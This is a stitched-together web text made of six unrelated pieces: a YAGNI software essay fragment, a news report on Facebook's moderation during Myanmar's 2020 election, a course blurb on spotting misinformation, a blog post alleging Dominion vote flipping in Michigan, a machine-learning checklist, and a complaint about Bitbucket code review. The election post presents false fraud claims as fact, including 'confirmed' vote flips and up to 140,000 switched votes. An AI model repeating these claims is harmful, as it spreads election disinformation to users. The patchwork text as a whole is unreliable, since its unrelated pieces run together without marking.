<p>Suffer me a brief, digressive analogy: <a href="http://www.roguetemple.com/z/hyper.php">Hyper Rogue III</a> is a game which takes place in a two-dimensional hyperbolic plane.  One implication of such a space is that it is very unlikely that a wanderer will ever return to a particular position unless she almost exactly follows her own trail of bread crumbs.  Exploring the space of computable functions is similarly dangerous to wanderers, except more so: we are not well equipped to even identify the hills, valleys, walls and contours of this space.</p>
<p>Hence my elaboration: the wanderer in the landscape of programming is very likely to lose his way.  He has neither physical constraints nor well developed intuition to guide him.  And despite the existence of tools like git, which promise us the ability to backtrack and refactor with some confidence, software inevitably ossifies as it grows.</p>
<p>Hence my elaboration: you don’t build things you don’t need because, if you don’t need them, you probably don’t really understand what they should be.  If you don’t understand what they should be, you’ll probably wander off base as you build them, and you probably won’t even notice that you have wandered off until something concrete impinges upon that code.  When that happens, you might find that refactoring to solve the problem you have now is prohibitively difficult, because that feature you thought you would need has subtly impinged on other parts of your code.</p>
<p>Explicit, concrete requirements are the closest thing you have to the physical constraints which make stone masonry a more reliable discipline than software engineering, and nothing but rote experience will ever give you the physical intuition that stone masons can rely on.  </p>
<p>So don’t wander off: You Aren’t Gonna Need It anyway.  At least until you do.</p>
<hr>
<p><sup>1</sup>: Well, the relationship between the <a href="http://en.wikipedia.org/wiki/Statistical_mechanics">physical constraints on software</a> and the software is, at any rate, not entirely trivial or transparent. </p>

<p>Wearing a plastic face shield and his orange monastic robes, Ashin Wirathu walked into a Yangon police station on November 2 after more than a year on the run. Until he went into hiding in June of last year, Wirathu, a nationalist preacher with links to the Tatmadaw — the Burmese military — was <a href="https://www.theguardian.com/global-development/2017/may/12/only-takes-one-terrorist-buddhist-monk-reviles-myanmar-muslims-rohingya-refugees-ashin-wirathu">one of Myanmar’s most prominent Islamophobes</a>, spreading bigotry and disinformation online. In May 2019, he was <a href="https://www.mmtimes.com/news/warrant-issued-arrest-ultranationalist-monk.html">charged with sedition</a>, but he <a href="https://myanmar-now.org/en/news/wirathu-declared-a-fugitive-after-failing-to-appear-at-court">never showed up</a> for his court date.</p>



<p>Wirathu’s surrender came in the final stages of an election campaign that once again exposed Myanmar’s racial and religious tensions, three years after a surge in hate speech and nationalist sentiment drove a campaign of ethnic cleansing targeting the country’s Muslim Rohingya minority.&nbsp;</p>



<p>The monk’s act was a piece of theater designed to put him and his anti-Muslim ideology back in the public eye and feed into the rumors and misinformation that was circulating online. Activists braced for a surge in hate speech on social media. It never came. The hard news of his arrest was covered by the mainstream press, but online, his supporters were strangely muted. Facebook pages sharing his views were flagged by civil society groups and quickly shut down by the platform.</p>



<p>“He didn’t get anything like the megaphone that he had hoped to get,” says Victoire Rio, a Yangon-based researcher and advisor to the Myanmar Tech Accountability Network, a consortium of nonprofit groups working on disinformation and hate speech. “The whole thing got fairly well contained, and that’s in big part because Facebook was able to take action.”</p>



	




<p>Facebook has faced years of criticism for its failings in Myanmar. In 2018, the <a href="https://uk.reuters.com/article/us-myanmar-rohingya-facebook/u-n-investigators-cite-facebook-role-in-myanmar-crisis-idUKKCN1GO2PN">United Nations alleged the platform</a>&nbsp;allowed the proliferation of hate speech that incited the genocide. Campaigners in the U.S. and in Myanmar had been pressuring the company to prepare for the 2020 elections to prevent further violence.</p>



<p>In response, Facebook began trialing a <a href="https://about.fb.com/news/2020/08/preparing-for-myanmars-2020-election/">new, more active approach</a> to dealing with hate speech and political disinformation in the run up to the vote on November 8. It involved limiting users’ ability to reshare old pictures without context — a common misinformation tactic — and working with local partners to verify political parties’ pages and fact-check stories.&nbsp;</p>



<p>Most significantly, the “community standards” Facebook uses to police content on its platforms were expanded. Usually, the company does not remove misinformation unless it creates a threat of imminent harm, but for a few months in Myanmar, that policy was broadened to include anything that could “suppress the vote or damage the integrity of the electoral process” — for example, a baseless rumor that the country’s de facto leader, Aung San Suu Kyi, had died from Covid-19, which circulated before the election. Normally, the company’s community standards defines “hate speech” narrowly as attacks on people not concepts — Muslims, but not Islam. That was changed to prevent users from targeting the religion itself or attacking “invaders” or “illegals,” derogatory terms that refer to the Rohingya.</p>



	




<p>It is the first time the company has created country-specific community standards.</p>



<p>“That was a huge deal,” Rio says. “A lot of the problematic content is not framed as hate speech or as a call to violence in the way that Facebook likes it to be, like <em>Cluedo</em> — the weapon, the victim, the location, the whole thing.”</p>



<p>Myanmar has a well-documented problem with online hate speech and malicious falsehoods, which often attack the country’s Muslims. Nationalists and ultra-conservative Buddhists have successfully portrayed Muslims as a threat to the country’s culture and majority religion and as foreign interlopers. This hostility is so widespread that in the 2020 election, mainstream political parties competed to portray their opponents as more sympathetic to Islam.</p>



<p>One widely shared claim, originating from a candidate for the military-backed Union Solidarity and Development Party, was that <a href="https://www.myanmar-now.org/en/news/nld-to-report-usdp-candidate-for-making-false-claims-about-muslims-in-the-ruling-party?page=2">Suu Kyi’s National League for Democracy (NLD) had 42 Muslim candidates</a>. The true number was two. An image circulated on social media showing an NLD meeting in which Buddhist monks appeared to be sitting on the floor while Muslim attendees sat on chairs, which, presented without context, looked like a calculated insult. Normally, such falsehoods would not have breached Facebook’s community standards.&nbsp;</p>

<p>In October and November, disinformation that tried to exploit religious differences to distort the election result was taken down by Facebook, as were fake “leaked documents” feeding conspiracy theories linking Suu Kyi to the financier and human rights activist George Soros and unfounded claims by the opposition that the vote was rigged.</p>



<p>Several of Facebook’s “trusted partners,” civil society organizations that the company gives a kind of express lane for reporting violations of community standards, told <em>Rest of World</em> that in October and November, when they reported falsehoods and hate speech, their complaints were quickly escalated and the flagged content was removed. Previously, they found that their interventions carried little weight.</p>



<p>“To their credit, [Facebook has] thrown in much more effort, many more resources, for this election than we’ve seen them do … in the last few years,” says Jes Kaliebe Petersen, CEO of Phandeeyar, a social-technology accelerator in Yangon. “That’s been very positive. They’ve had boots on the ground; they’ve had people from their Singapore team dedicated to this. They’ve engaged with civil society.”</p>



<p>In October, Facebook <a href="https://uk.reuters.com/article/uk-facebook-myanmar/facebook-shuts-dozens-of-myanmar-pages-over-inauthentic-behaviour-idUKKBN27M1BC">removed dozens of accounts</a> for “coordinated inauthentic behavior,” its term for spreading disinformation, and dismantled networks of fake users and clickbait pages that were pushing political misinformation. (Data for Facebook’s takedowns in November is not yet available.) Activists told <em>Rest of World</em> that the approach led to a significant reduction in disinformation and hate speech compared to the previous election five years ago.</p>



<p>“I’m not saying there is no hate speech in 2020, but I think it’s much less than in 2015,” says Harry Myo Lin, an interfaith activist. “They have a more active response to reports and hateful content. It’s not perfect, but I think they did better than before.”</p>



<p>A side effect of Facebook’s crackdowns on hate speech some actors migrated to other platforms, including the Russian social network VK and YouTube — exposing the latter’s own deficiencies in dealing with malicious content. “YouTube, now, is the most problematic one,” says Myat Thu, founder of the Yangon-based fact-checking site Think Before You Trust.&nbsp;</p>



<p>Google-owned YouTube did not respond to a request for comment.</p>



<p>With the vote now over — the incumbent NLD won in a decisive victory — Facebook is set to return to its pre-election policies on December 6, leaving activists concerned that the platform will revert to being a place where hate and disinformation continues to circulate.</p>



<p>“The big question is: What happens next?” Petersen says. “Is this a sign of a new level of consistent support and focus from Facebook, or is it like a SWAT team that they put in, and now … the SWAT team is going to leave again, and we’re back to where we were before.”</p>



<p>In a statement, Facebook said it considers the experiment a success and could adapt it for other countries in the future.</p>



<p>At the Myanmar Tech Accountability Network, Rio said that while Facebook’s experimental approach still had profound flaws, it demonstrated that the company does have the tools to deal with the corrosive misinformation and bigotry that have proliferated on the platform worldwide.</p>



<p>“We need to give them credit where it’s due. They did pretty well,” Rio says. “But if anything, it shows that when they want to, they can.”</p>

<p><em><strong>A course for children in Grades 8-10.</strong></em></p>

<p>The information age is quickly turning into a misinformation age as we are increasingly being manipulated and lied to, by everyone. Our leaders, our media, the companies trying to sell us things, the companies wanting to collect our data, and even the companies claiming to expose the lies of other companies are manipulating us. In fact, even our friends and family inadvertently end up doing the same when they send us 'forwards' without critically analyzing them for accuracy.</p>
<p>One of the most important skills to learn is the ability to spot these lies and protect ourselves from being manipulated. This course will use practical examples and case-studies to analyze how and why the manipulation occurs, how and why most targets fall for these tricks, and how to spot, analyze and disarm them.</p>

<p>We will look at two broad problems: outright lies ("fake news") and technically true statements that are created to mislead. For lies, we will analyze how to spot lies, why even easy-to-disprove lies are widely believed, and how to prevent ourselves from falling for such lies. In case of misleading truths, we will see ways in which numbers and statistics can mislead (for example, use of absolute values instead of percentages or vice versa, or use of mean instead of Median or vice versa), ways in which text/stories/graphics can mislead (for example, in advertisements), and common sense ways in which to estimate the accuracy of the statements (for example, through basic web searches for information, looking for connections and relationships, making approximations and ballpark estimates).</p>

<p>After this course, students would be better equipped to defend themselves against the dark arts of social media manipulation.</p></div><div title="navin kabra photo.png" data-is-responsive="false" data-display-mode="fill" data-content-padding-horizontal="0" data-content-padding-vertical="0" data-exact-height="202" id="comp-kaphhov4"><a href="https://www.genwise.in/our-instructors/Navin-Kabra" target="_self" id="comp-kaphhov4link"><wix-image data-has-bg-scroll-effect="" data-image-info="{&quot;imageData&quot;:{&quot;type&quot;:&quot;Image&quot;,&quot;id&quot;:&quot;comp-kaphhov4_runtime_dataItem-kaphhp6n&quot;,&quot;metaData&quot;:{&quot;pageId&quot;:&quot;bcpzw&quot;,&quot;isPreset&quot;:false,&quot;schemaVersion&quot;:&quot;2.0&quot;,&quot;isHidden&quot;:false},&quot;title&quot;:&quot;navin kabra photo.png&quot;,&quot;uri&quot;:&quot;98f7cd_c1146be150aa40dc91e5feafc400ffb6~mv2.png&quot;,&quot;description&quot;:&quot;&quot;,&quot;width&quot;:1123,&quot;height&quot;:1312,&quot;alt&quot;:&quot;Navin Kabra&quot;,&quot;name&quot;:&quot;navin kabra photo.png&quot;,&quot;crop&quot;:null,&quot;link&quot;:{&quot;type&quot;:&quot;DynamicPageLink&quot;,&quot;innerRoute&quot;:&quot;Navin-Kabra&quot;,&quot;routerId&quot;:&quot;routers-k1j3n23p&quot;,&quot;id&quot;:&quot;comp-kaphhov4_runtime_dataItem-kaphhp6nlink&quot;},&quot;displayMode&quot;:&quot;fill&quot;},&quot;containerId&quot;:&quot;comp-kaphhov4&quot;,&quot;displayMode&quot;:&quot;fill&quot;}" data-has-ssr-src="true" data-is-svg="false" data-is-svg-mask="false" id="comp-kaphhov4img"><img id="comp-kaphhov4imgimage" alt="Navin Kabra" data-type="image" itemprop="image" src="https://static.wixstatic.com/media/98f7cd_c1146be150aa40dc91e5feafc400ffb6~mv2.png/v1/fill/w_168,h_196,al_c,usm_0.66_1.00_0.01,blur_3/navin%20kabra%20photo.png"></wix-image></a></div><p><span><span><span>Navin Kabra is CTO and Co-Founder at ReliScore, a company that provides skill and capability assessment solutions to the software industry.

<p>By Patrick Colbeck</p>



<p>I’m not sure how you have spent your day today, but I spent mine reviewing contracts and system overview documents related to voting systems.  Why is that?  You may have heard about the <a href="https://thepostmillennial.com/software-glitch-caused-6-000-republican-votes-to-swing-democrat-in-michigan-county">6,000 votes in Antrim County</a>, Michigan that were flipped via software from Donald Trump to Joe Biden. No one denies the veracity of this claim.  The only differences between various parties involved revolve around explanations for exactly how that happened.  </p>



<p>The media has already projected that Michigan’s 16 Electoral College votes will go to Joe Biden.  This projection is based upon an assertion that Joe Biden leads Donald Trump by 146,123 votes.  Any attempt to assert that Michigan is “in play” would have to account for that large of a deficit.  As it turns out, we can.  Against the backdrop of the 6,000 vote “flip” in Antrim County, we have also identified evidence of algorithmic data manipulation in three other counties that could account for as many as 140,000 votes being switched from Donald Trump to Joe Biden in Michigan…and that is through examination of only 3 out of the 83 counties in Michigan.  In the wake of election fraud allegations, <a href="https://www.mlive.com/politics/2020/11/federal-lawsuit-seeks-to-throw-out-12m-votes-flipping-michigan-for-trump.html?fbclid=IwAR2H1saVwouRyRpAnhkWghxhOPhfODvEjDJA8uz9fLVe4OGl9Sdlt1JsES0">a Federal Lawsuit has been filed that addresses 1.2 Million ballots cast in Michigan</a>.  The bottom line is that the election fraud observed to date can indeed impact the election results in Michigan and potentially the nation as a whole.</p>



<p>Key findings:</p>



<div><div>
<ul><li>Dominion Voting Systems are designed to connect to the internet including wireless internet connections which could be accessed outside of a vote counting facility. Introduces significant chain of custody concerns regarding vote tallies.</li><li>My personal attempts to discern the chain of custody regarding how vote tallies were to be transferred from the counting board tabulation machines to the county were met with deflection and avoidance by one of the Senior election officials, Chris Thomas.</li><li>According to Dominion, there are two methods available to users of the Dominion Voting system to transfer vote tally data to election officials: 1) physical transfer via flash drive or 2) over a network connection.  </li><li>The inability to verify which method is used obstructs the statutory duties of a poll challenger and puts election integrity at risk.</li><li>According to the Detroit Elections Manual, flash drives were to be used to transfer the data, but it was obvious from review of the network configuration that network connections were in use including Wi-Fi connections.  </li><li>If memory cards were indeed intended to be used, it would have raised additional chain of custody concerns regarding these cards.  In Philadelphia, <a href="https://philadelphia.cbslocal.com/2020/09/30/laptop-encrypted-usb-drives-stolen-from-philadelphia-election-machine-warehouse-officials/">an election laptop and encrypted flash drives were stolen from an election machine warehouse in September</a>.</li><li>A forensic audit of the voting system configuration in Antrim County revealed that an open port had been accessed in the Dominion voting machines putting chain of custody at risk.</li><li>If a computer is connected to the internet, all resources on that computer, including voting data, is vulnerable to remote manipulation.  See my <a href="https://letsfixstuff.org/2020/08/lets-fix-election-integrity-ev/">Election Integrity Solution Podcast</a> for more information on this risk.</li></ul>

<p>Why is internet connectivity a big deal?  It enables top-down manipulation of vote tallies.  </p>



<p>Some of you may have seen examples of “vote flipping” on live news network feeds in which thousands of votes were added to Joe Biden while the exact number of votes were subtracted from Donald Trump.  </p>



<p><a href="https://rumble.com/vb236n-proof-why-trump-will-win-part-2.html">SEE VIDEO PROOF OF VOTE FLIPPING</a></p>



<p>Remember, these “flips” have already been confirmed to have happened in Antrim County.  </p>



<p>At the end of the night, though, any electronic vote switching must be reconciled with other ballot records such as the poll books and physical ballot counts.  All precincts must be balanced to ensure the integrity of that precincts vote tally.</p>



<p>Many of you may recall news stories of a cessation of voting activities across many of the major cities in battleground states between Midnight and 4:00am on November 4.  <a href="https://www.politifact.com/factchecks/2020/nov/04/facebook-posts/battleground-states-did-not-stop-counting-votes-el/">According to Politifacts this assertion is FALSE</a>.  </p>



<blockquote><p>“At no point has the counting process stopped since it began at 7 a.m. yesterday morning, which was when, per Michigan election law, it could begin,” said Tracy Wimmer, director of media relations for Michigan Secretary of State Jocelyn Benson, referring to the morning of Nov. 3.</p><cite>SOURCE:  <a href="https://www.politifact.com/factchecks/2020/nov/04/facebook-posts/battleground-states-did-not-stop-counting-votes-el/">Politifact</a></cite></blockquote>



<p>I was on the floor of the AV Counting Board in Detroit between midnight and 4:00am.  Counting activity had indeed stopped during that time period.  In fact, the only apparent ballots available to count at that time were around 12 boxes of military ballots.  Rather than count these ballots during overnight quiet period, Detroit Election Officials chose to wait until they had prohibited access to the AV Counting Board by Poll Challengers such as myself.  I had left to train our next wave of poll challengers in a break room upstairs only to find that my re-entry to the counting board was prohibited. </p>



<div><figure><img loading="lazy" width="1024" height="576" src="https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-1024x576.jpg" alt="" srcset="https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-1024x576.jpg 1024w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-300x169.jpg 300w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-768x432.jpg 768w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-1536x864.jpg 1536w, https://secureservercdn.net/198.71.233.150/bkq.639.myftpupload.com/wp-content/uploads/2020/11/More-Cardboard-2048x1152.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>SOURCE:  Cardboard on Windows at Detroit AV Counting Board by Patrick Colbeck</figcaption></figure></div>



<p>So, why would the ballot count be stopped if there were ballots remaining to be counted?  The end of shift for the poll workers on duty was 5:00am.  Well, one could make the claim that they were waiting for word on the number of votes they needed to win the state.  Perhaps coincidentally, a Detroit Elections Bureau vehicle arrived at the back entrance of the AV Counting Board with 61 mail bins full of ballots at 3:45 am.  I witnessed ballot after ballot being placed upon staging tables after a very quiet night.  Could it be that this was an attempt to ensure that the paper trail matched with the electronic vote tally?</p>



<p>Is it even possible to modify the electronic vote tally?  According to <a href="https://www.thegatewaypundit.com/2020/11/dominion-voting-systems-officer-strategy-security-eric-coomer-admitted-2016-vendors-election-officials-access-manipulate-vote/">Dominion Voting Systems Officer of Strategy and Security, the answer is yes.</a></p>



<blockquote><p><strong>Dr. Coomer’s statement brings to light a very serious issue all voters should understand.</strong>&nbsp;Voting systems must be re-certified each time they make changes to the hardware or software. Recertification is an expensive and time consuming process.&nbsp;<strong>What Dr. Coomer told the Board is that Dominion Voting does not go back for recertification of software when threats to their code are discovered.&nbsp;</strong>Rather, they rely on post-election audits and providing advice to election jurisdictions about security. I have reviewed all of the recertification documents produced by Dominion, and I do not recall any software adjustments for security purposes.</p><p><strong>This is the reality of the security of your vote.</strong>&nbsp;Software systems that count and record the vote across Illinois and throughout the USA are not updated to address security problems, and even if they were, the software can be completely bypassed by going to the data tables that drive the systems.</p><cite>SOURCE:  <a href="https://www.thegatewaypundit.com/2020/11/dominion-voting-systems-officer-strategy-security-eric-coomer-admitted-2016-vendors-election-officials-access-manipulate-vote/">The Gateway Pundit</a></cite></blockquote>



<p>So, if vote tallies were electronically manipulated, what records need to be preserved to verify that it happened?  In order to answer that question, let’s take a closer look at the design of the Dominion Voting System.</p>

<p>Upon review of the design of the Dominion Voting System, what components merit further examination?</p>



<p>While ALL equipment and records need to be secured as soon as possible, I believe the security of our election boils down to the secure retention and examination of the following key artifacts:</p>



<ul><li>ImageCast Listener Module: “The ImageCast Listener module is responsible for receiving and tracking encrypted results file transmissions from any ImageCast Election Day tabulator.”</li><li>Image Cast Evolution Memory Card: “The ICE memory card has only one partition that holds the ballot images, election database, audio files, etc” (<em>Very curious as to what “etc” might entail</em>)</li><li>EMS Audit Log:  “From the initial state of the election project, until the deactivation state, the EMS system maintains an activity log within the EMS Database. This activity log contains every action that any of the users have performed within the system and represents a detailed audit log that can be analyzed and printed in the form of an audit report. The audit record information cannot be modified or permanently deleted using the EMS client applications. It can, however, be exported for archiving purposes as part of the record retention policy. Keeping in mind that audit log information can contain a significant amount of information, it is the responsibility of the administrative user to perform regular archiving of the log.  During the voting phase of the election event, ImageCast devices also keep an activity audit log which tracks events happening on the device itself.”</li><li>Event logs from the Election Official, Electronic Poll Book, Tabulator and Adjudicator computers</li></ul>



<p>There are <a href="https://letsfixstuff.org/2020/11/michigan-election-fraud-is-real-and-significant/">numerous lawsuits</a> in progress through the state and federal court systems which allege election fraud.  It will take time to gather and evaluate all of the artifacts cited above.  The Dominion Voting System is complex.  This complexity is compounded by vote tally chain of custody concerns enabled by the connection of this system to the internet.  It will take weeks, even months potentially, to reveal the truth of what caused software “glitches” such as the Antrim County vote flip and other “flips” observed throughout the early morning hours of November 4th.</p>



<p><em>NOTE:  <a href="https://uscode.house.gov/view.xhtml?req=granuleid:USC-prelim-title52-section20701&amp;num=0&amp;edition=prelim">52 USC Section 20701</a> requires that election records are retained for 22 months from the date of the election.  Furthermore, willful destruction of these records would likely be seen by courts as justification for issuing orders to redo the election.</em></p>

<!-- What is the value for the user/reader?  -->

<p>Use this 8-step machine learning checklist to guide you through your machine learning projects.</p>

<p>I found this checklist the appendix of <a href="https://www.amazon.com/Hands-Machine-Learning-Scikit-Learn-TensorFlow/dp/1491962291">Hands-On Machine Learning with Scikit-Learn and TensorFlow</a>.
Every machine learning project should use this checklist, or at least part of
it.</p>

<p>The checklist:</p>

<ol>
  <li>Frame the problem and look at the big picture.</li>
  <li>Get the data.</li>
  <li>Explore the data to gain insights.</li>
  <li>Prepare the data to better expose the underlying data patterns to machine learning algorithms.</li>
  <li>Explore many different models and shortlist the best ones.</li>
  <li>Fine-tune your models and combine them into a great solution.</li>
  <li>Present your solution.</li>
  <li>Launch, monitor, and maintain your system.</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-13-58-51.png" alt=""></p>

<p>In this step you frame the problem and try to look at the big picture. This
step answers questions such as: What problem are we solving? What business
objective does it solve? Who is going to consume my solution? What is the
current solution? At the end of this step you’ll have a solid grasp of the
big picture of what you’re solving.</p>

<p>Checklist:</p>

<ol>
  <li>Define the objective in business terms.</li>
  <li>How will your solution be used?</li>
  <li>What are the current solutions/workarounds (if any)?</li>
  <li>How should you frame this problem (supervised/unsupervised, online/offline, etc.)?</li>
  <li>How should performance be measured?</li>
  <li>Is the performance measure aligned with the business objective?</li>
  <li>What would be the minimum performance needed to reach the business objective?</li>
  <li>What are comparable problems? Can you reuse experience or tools?</li>
  <li>Is human expertise available?</li>
  <li>How would you solve the problem manually?</li>
  <li>List the assumptions you (or others) have made so far.</li>
  <li>Verify assumptions if possible.</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-13-59-17.png" alt=""></p>

<p>In the second step we fetch the data. Try to automate as much as possible so
you always have the freshest data. At the end of this step you will have a
raw dataset.</p>

<p>Checklist:</p>

<ol>
  <li>List the data you need and how much you need.</li>
  <li>Find and document where you can get that data.</li>
  <li>Create a workspace (with enough storage space).</li>
  <li>Get the data.</li>
  <li>Convert the data to a format you can easily manipulate (without changing the data itself).</li>
  <li>Ensure sensitive information is deleted or protected.</li>
  <li>Check the size and type of data (time series, sample, geographical, etc.).</li>
  <li>Sample a test set, put it aside, and never look at it.</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-13-59-30.png" alt=""></p>

<p>In the third step do exploratory data analysis (EDA). We explore the data and
try to figure out the “health” and “shape” of the data (missing values,
distributions, etc.) At the end of this step you’ll have a solid
understanding and feel of the dataset.</p>

<p>Checklist:</p>

<ol>
  <li>Create a copy of the data for exploration (sampling it down to a manageable size if necessary).</li>
  <li>Create a Jupyter notebook to keep a record of your data exploration.</li>
  <li>Study each attribute and its characteristics:
    <ul>
      <li>Name</li>
      <li>Type (categorical, int/float, bounded/unbounded, text, structured, etc.)</li>
      <li>% of missing values</li>
      <li>Noisiness and type of noise (stochastic, outliers, rounding errors, etc.)</li>
      <li>Usefulness for the task</li>
      <li>Type of distribution (Gaussian, uniform, logarithmic, etc.)</li>
    </ul>
  </li>
  <li>For supervised learning tasks, identify the target attribute(s).</li>
  <li>Visualize the data.</li>
  <li>Study the correlations between attributes.</li>
  <li>Study how you would solve the problem manually.</li>
  <li>Identify the promising transformations you may want to apply.</li>
  <li>Identify extra data that would be useful.</li>
  <li>Document what you have learned.</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-13-59-50.png" alt=""></p>

<p>In this step you’re going to prepare the data. At the end of this step you’ll
have a set of functions/transformers that perform data transformations. These
transformers turn your raw data into preprocessed cleaned data, ready to be
used by machine learning algorithms.</p>

<p><strong>Set yourself up for success by writing functions for your data
transformations!</strong></p>

<p>Write functions for all data transformations you apply, for five reasons:</p>
<ul>
  <li>So you can easily prepare the data the next time you get a fresh dataset</li>
  <li>So you can apply these transformations in future projects</li>
  <li>To clean and prepare the test set</li>
  <li>To clean and prepare new data instances once your solution is live</li>
  <li>To make it easy to treat your preparation choices as hyperparameters</li>
</ul>

<p>Checklist:</p>

<ol>
  <li>Data cleaning:
    <ul>
      <li>Fix or remove outliers (optional).</li>
      <li>Fill in missing values (e.g., with zero, mean, median…) or drop their rows (or columns).</li>
    </ul>
  </li>
  <li>Feature selection (optional):
    <ul>
      <li>Drop the attributes that provide no useful information for the task.</li>
    </ul>
  </li>
  <li>Feature engineering, where appropriate:
    <ul>
      <li>Discretize continuous features.</li>
      <li>Decompose features (e.g., categorical, date/time, etc.).</li>
      <li>Add promising transformations of features (e.g., log(x), sqrt(x), x2, etc.).</li>
      <li>Aggregate features into promising new features.</li>
    </ul>
  </li>
  <li>Feature scaling:
    <ul>
      <li>Standardize or normalize features.</li>
    </ul>
  </li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-14-00-02.png" alt=""></p>

<p>Checklist:</p>

<ol>
  <li>Train many quick-and-dirty models from different categories (e.g., linear,
naive Bayes, SVM, Random Forest, neural net, etc.) using standard
parameters.</li>
  <li>Measure and compare their performance.
    <ul>
      <li>For each model, use N-fold cross-validation and compute the mean and standard deviation of the performance measure on the N folds.</li>
    </ul>
  </li>
  <li>Analyze the most significant variables for each algorithm.</li>
  <li>Analyze the types of errors the models make.
    <ul>
      <li>What data would a human have used to avoid these errors?</li>
    </ul>
  </li>
  <li>Perform a quick round of feature selection and engineering.</li>
  <li>Perform one or two more quick iterations of the five previous steps.</li>
  <li>Shortlist the top three to five most promising models, preferring models
that make different types of errors.</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-14-00-12.png" alt=""></p>

<p>Don’t tweak your model after measuring the generalization error: you would just
start overfitting the test set.</p>

<p>Checklist:</p>

<ol>
  <li>Fine-tune the hyperparameters using cross-validation:
    <ul>
      <li>Treat your data transformation choices as hyperparameters, especially when
 you are not sure about them (e.g., if you’re not sure whether to replace
 missing values with zeros or with the median value, or to just drop the
 rows).</li>
      <li>Unless there are very few hyperparameter values to explore, prefer random
 search over grid search. If training is very long, you may prefer a
 Bayesian optimization approach (e.g., using Gaussian process priors, as
 described by Jasper Snoek et al.).1</li>
    </ul>
  </li>
  <li>Try Ensemble methods. Combining your best models will often produce better
performance than running them individually.</li>
  <li>Once you are confident about your final model, measure its performance on
the test set to estimate the generalization error.</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-14-00-22.png" alt=""></p>

<p>Checklist:</p>

<ol>
  <li>Document what you have done.</li>
  <li>Create a nice presentation.
    <ul>
      <li>Make sure you highlight the big picture first.</li>
    </ul>
  </li>
  <li>Explain why your solution achieves the business objective.</li>
  <li>Don’t forget to present interesting points you noticed along the way.
    <ul>
      <li>Describe what worked and what did not.</li>
      <li>List your assumptions and your system’s limitations.</li>
    </ul>
  </li>
  <li>Ensure your key findings are communicated through beautiful visualizations
or easy-to-remember statements (e.g., “the median income is the number-one
predictor of housing prices”).</li>
</ol>



<p><img src="https://www.janmeppe.com/assets/2020-11-20-machine-learning-checklist/2020-11-20-14-02-21.png" alt=""></p>

<p>Checklist:</p>

<ol>
  <li>Get your solution ready for production (plug into production data inputs,
write unit tests, etc.).</li>
  <li>Write monitoring code to check your system’s live performance at regular
intervals and trigger alerts when it drops.
    <ul>
      <li>Beware of slow degradation: models tend to “rot” as data evolves.</li>
      <li>Measuring performance may require a human pipeline.</li>
      <li>Also monitor your input’s quality.</li>
    </ul>
  </li>
  <li>Retrain your models on a regular basis on fresh data (automate as much as possible).</li>
</ol>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>I consider PR reviews as one of the fundamental and most important
tools developers have to collaborate. We use it daily to submit changes and
to get important feedback from peers and more experienced developers.</p>
<p>And so, <strong>it should be targeted to software developers and not to managers</strong>.</p>
<p>Let’s cover some of the daily tortures of dealing with <a href="https://bitbucket.org/">Bitbucket</a>, which
I unfortunately need to deal with.</p>

<blockquote>
<p>Hey friend, how about you implement this piece of functionality in this other way?</p>
</blockquote>
<p>This common and healthy workflow is <strong>fundamentally broken</strong> in BB because
you cannot copy code from the body of the PR into a comment without getting
a lot more than what you clearly selected.</p>
<p><img src="https://nosleepjavascript.com/460408cff29803e91776376bae5605ad/copypastev3.gif" alt="Copying and pasting code from PR changes is broken"></p>

<p>Trying to click anywhere else when writing a comment like for example
expanding to see more code will result in an alert that states
that your comment changes will be removed which is already super annoying.
But if you even do not care about discarding your comment and you go ahead
and click on discard the comment isn’t really discarded! So it is completely misleading.</p>
<p>This is BB not caring about the amount of time developers throw into detailed
code reviews.</p>
<p><img src="https://nosleepjavascript.com/7a16dbe4130224ea56472f85903a24f7/commentclick.gif" alt="Are you sure you want to discard (actually not) your comments?"></p>
<h2 id="what-you-see-may-be-what-you-get-horrible-markdown-support"><a href="#what-you-see-may-be-what-you-get-horrible-markdown-support" aria-label="what you see may be what you get horrible markdown support permalink"></a>What You See May Be What You Get: horrible markdown support</h2>
<p>Markdown is a tool aimed for technical folks, it is minimal but gets
the job done without any distractions, it is <em>not</em> <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> (what you see is what you get)
by design and partially for simplicity.</p>
<p>BB takes the worse of all worlds: horrible “standard” markdown support
that varies across places and combine it with a <a href="https://en.wikipedia.org/wiki/WYSIWYG">WYSIWYG</a> editor.
This creates really weird
use cases we will cover below.</p>
<p>Other technical tools, such as <a href="https://github.com/">Github</a>, understand how important decent markdown
support is and they use it to empower developers.
They do build visual tools on top of markdown but without combining them
into a monster broken implementation.</p>
<p>Let’s see some specially frustrating cases</p>
<h3 id="selecting-a-code-block-language"><a href="#selecting-a-code-block-language" aria-label="selecting a code block language permalink"></a>Selecting a code block language</h3>
<p>Instead of using the standard <strong>”```typescript”</strong> they include a visual
Select. Guess what, professional developers don’t need this help at all, and
newbies can search the web once and forget about this.</p>
<p>Think about ergonomics, with regular markdown you do everything with the keyboard,
with the BB inferno you first need to type the three backward ticks and then grab the
mouse and select your language and then click back on the code block.</p>
<p>This is a really poor understanding of your user’s UX!</p>
<p><img src="https://nosleepjavascript.com/e7b45f374d83485074abc0f93fc73afb/mdlang.gif" alt="selecting code block language"></p>
